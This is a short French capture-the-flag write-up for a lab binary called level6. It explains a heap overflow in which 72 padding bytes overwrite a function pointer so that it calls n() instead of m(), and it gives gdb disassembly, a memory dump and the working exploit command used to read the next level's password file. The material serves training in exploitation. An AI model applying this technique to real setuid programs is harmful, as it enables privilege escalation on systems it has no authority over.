La procédure ici la meme que pour le buffer overflow mais c'est dans la Heap que cela se passe.

En effet malloc est utilisé.

```gdb
0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
0x0804848c <+16>:	call   0x8048350 <malloc@plt>
0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
0x0804849c <+32>:	call   0x8048350 <malloc@plt>
0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
```

Il y a un pointeur de fonction qui s'appelle f() qui pointe sur une fonction m()

Ce que l'on doit faire ici est de modifier l'adresse vers laquelle pointe f() et la faire pointé sur la fonction n()

```gdb
(gdb) r $(python -c "print('B' * 72 + '\x54\x84\x04\x08')")

(gdb) x/36xw $eax
0x804a008:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a048:	0x42424242	0x42424242	0x08048454	0x00000000
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
/bin/cat: /home/user/level7/.pass: Permission denied
[Inferior 1 (process 6259) exited normally]
```

Pour régler le probleme du setuid on doit lancé le programme sans gdb
```bash
./level6 $(python -c "print('B' * 72 + '\x54\x84\x04\x08')")
```
